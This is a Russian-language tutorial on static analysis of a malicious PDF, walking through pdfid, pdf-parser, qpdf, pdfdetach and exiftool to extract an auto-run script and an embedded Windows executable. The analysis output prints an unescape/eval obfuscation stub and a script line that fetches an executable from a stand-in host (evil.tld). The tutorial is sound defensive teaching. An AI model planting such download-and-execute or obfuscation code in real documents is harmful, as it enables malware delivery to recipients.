## Вопрос, с которого всё начинается

В почтовом ящике лежит вложение `mal.pdf` — «подтверждение брони». Открывать его в просмотрщике рискованно: PDF умеет выполнять JavaScript прямо при открытии, как макрос в Office. Нужно понять, что внутри, статически — не запуская файл.

PDF только выглядит как картинка. На деле это **контейнер объектов**: словари, массивы, потоки и таблица смещений. Разберём `mal.pdf` слой за слоем.

## Наш пример: `mal.pdf`

Первый факт — версия формата. Каждый PDF начинается строкой-маркером `%PDF`:

```bash
$ file mal.pdf
mal.pdf: PDF document, version 1.7
$ head -c 8 mal.pdf
%PDF-1.7
```

Теперь быстрый обзор. Инструмент `pdfid.py` (из `Didier Stevens`-набора) не разбирает структуру глубоко — он просто считает, сколько раз в файле встречаются «опасные» ключевые слова:

```bash
$ pdfid.py mal.pdf
/JS                1
/JavaScript        1
/OpenAction        1
/EmbeddedFile      1
/Launch            0
```

Здесь важно всё. `/JS` и `/JavaScript` — в документе есть скрипт. `/OpenAction` — действие, которое выполняется **при открытии**. `/EmbeddedFile` — вложенный файл. Всё это красные флаги: PDF с автозапускающимся скриптом и вложением — классический фишинг.

## Шаг 1: проверяем инкрементальные обновления

Есть у PDF особенность, которую легко упустить. Документ можно **дописывать**: новая версия добавляется в конец файла, а старая остаётся внутри. Это называется **инкрементальное обновление**. Каждая версия заканчивается маркером `%%EOF` («end of file»).

```bash
$ grep -aboP '%%EOF' mal.pdf
2410:%%EOF
9821:%%EOF
11340:%%EOF
```

Три `%%EOF` — три версии в одном файле. Значит, содержимое меняли: например, «безобидную» версию оставили для вида, а вредоносную дописали. Разбирать нужно **каждую** версию, а не только последнюю — в старых могут лежать удалённый текст или флаг.

## Шаг 2: находим и извлекаем JavaScript

Ключ `/JS` указывает на объект-скрипт. Находим его по номеру и вытаскиваем:

```bash
$ pdf-parser.py --search javascript mal.pdf
obj 5 0
 Type: /Action
 Referencing: /S /JavaScript, /JS

$ pdf-parser.py --object 5 --filter --raw mal.pdf
var s = unescape('%u0048%u0065%u006C%u006C%u006F...');
eval(s);
```

Флаг `--filter` заставляет `pdf-parser.py` применить к потоку его фильтр сжатия (в PDF потоки часто сжаты `FlateDecode`), а `--raw` — отдать результат как есть. Мы получили код: строка закодирована через `unescape` с `%u`-последовательностями (это просто юникод-символы в hex), а `eval` её выполняет. Смысл: обфускация, чтобы антивирус не увидел открытый текст.

## Шаг 3: декодируем поток и читаем скрипт

Чтобы увидеть всё в читаемом виде, перестраиваем PDF инструментом `qpdf`. Ключ `--qdf` делает «читаемую» версию: распаковывает потоки и выносит таблицу смещений (`xref`) на вид. `--object-streams=disable` дополнительно вытаскивает объекты из сжатых контейнеров.

```bash
$ qpdf --qdf --object-streams=disable mal.pdf decoded.pdf
$ grep -A6 '/JS' decoded.pdf
/JS 6 0 R
6 0 obj
<< /Length 42 >>
stream
var u = 'http://evil.tld/p.exe';
```

Теперь скрипт виден целиком: он тянет исполняемый файл с внешнего URL. Если обфускация многослойная, помогает `peepdf` — интерактивный анализатор с командами `js_unescape` и `decode`.

## Шаг 4: достаём вложение

Ключ `/EmbeddedFile` говорит, что внутри лежит файл. Его извлекают отдельно:

```bash
$ pdfdetach -list mal.pdf
1 embedded: p.exe
$ pdfdetach -saveall mal.pdf
$ file p.exe
p.exe: PE32 executable (GUI) Intel 80386, for MS Windows
```

Вложение оказалось Windows-исполняемым файлом. Его обязательно хешируют (отпечаток содержимого для IOC и сверки с VirusTotal) и анализируют как отдельный malware-образец.

## Шаг 5: метаданные и скрытое

Последний штрих — метаданные и «мусор» в файле. Они дают атрибуцию (кто и чем создал документ) и иногда прячут флаг:

```bash
$ exiftool mal.pdf | grep -iE 'author|creator|producer|title'
Author          : Ivan
Creator         : Microsoft Word
Producer        : Adobe Acrobat
$ strings -n 8 mal.pdf | grep -iE 'flag|secret'
```

Несоответствие `Creator` и `Producer` — тоже зацепка: документ могли собрать не тем, чем заявлено.

## Если файл не разбирается

Бывает, что `pdf-parser.py` ругается на битую таблицу смещений (`xref`) — файл обрезали или «сломали» специально, чтобы инструменты спотыкались. Тогда `qpdf` пытается восстановить структуру:

```bash
$ qpdf --recover mal.pdf fixed.pdf
```

`--recover` перестраивает файл с нуля, отбрасывая повреждённые части. Если и это не помогает, объекты ищут вручную — по маркерам `N 0 obj`:

```bash
$ grep -aboP '[0-9]+ 0 obj' mal.pdf | head
```

Второй частый случай — **шифрование** (`/Encrypt` в файле). Без пароля содержимое не читается; пароль берут из переписки или подбирают слабый, а затем снимают защиту:

```bash
$ qpdf --password=PASS --decrypt mal.pdf out.pdf
```

Ещё помните про линеаризацию: веб-просмотрщикам PDF отдают «оптимизированным» (словарь `linearized` в начале). На содержимое это не влияет, но ручной разбор усложняет — `qpdf --qdf` его снимает.

## Полный разбор: от объекта к полезной нагрузке

Соберём разбор `mal.pdf` в один сценарий.

1. **Смотрим структуру.** `pdfid.py mal.pdf` — есть ли `/JS`, `/JavaScript`, `/OpenAction`, `/EmbeddedFile`.
2. **Ищем инкрементальные обновления.** PDF может содержать несколько версий; последняя `%%EOF` не всегда настоящая — ищите все.
3. **Извлекаем JavaScript.** `pdf-parser.py --search javascript --raw mal.pdf` — получаем скрипт.
4. **Декодируем поток.** `/Filter /FlateDecode` → zlib; `pdf-parser --object <n> --raw | zlib-flate -uncompress`.
5. **Достаём вложение.** `/EmbeddedFile` → встроенный PE/архив.
6. **Метаданные.** `/Author`, `/Producer`, `/CreationDate` — часто указывают генератор малвари.

Ключ: PDF — контейнер объектов; вредонос живёт в `/JS`/`/OpenAction`/вложении, а не «в тексте».

## Шпаргалка объектов PDF

| Объект | Что означает |
|--------|--------------|
| `/OpenAction` | действие при открытии (автозапуск) |
| `/JS`, `/JavaScript` | встроенный скрипт |
| `/Launch` | запуск программы |
| `/EmbeddedFile` | вложенный файл |
| `/FlateDecode` | сжатый поток (zlib) |
| `/Encrypt` | шифрование (нужен пароль) |

Инструменты: `pdfid`, `pdf-parser`, `peepdf`, `pdfextract`.

## Частые вопросы

**PDF не открывается в просмотрщике, но существует.** Это норма для малвари — она может быть повреждена намеренно, чтобы устоять к «простому» анализу.

**Как обойти пароль?** Часто «пароль» — фиктивная защита; `peepdf`/`qpdf --decrypt` справляются.

**JavaScript обфусцирован.** Прогоните через `js-beautify` и замените `eval` на вывод; ищите hex/`String.fromCharCode`.

**Вложение зашифровано.** Ищите ключ в скрипте; часто он там же.

## Что мы теперь знаем

- PDF — контейнер объектов; `pdfid.py` быстро показывает опасные ключи (`/JS`, `/OpenAction`, `/EmbeddedFile`).
- `%%EOF` встречается несколько раз — значит есть инкрементальные обновления, и старые версии надо смотреть отдельно.
- Скрипт достаётся `pdf-parser.py --object N --filter --raw`, а «читаемую» версию всего файла делает `qpdf --qdf`.
- Вложения вытаскивает `pdfdetach -saveall`; их хешируют и разбирают отдельно.
- Метаданные (`exiftool`) дают атрибуцию; `strings` может вскрыть скрытое.
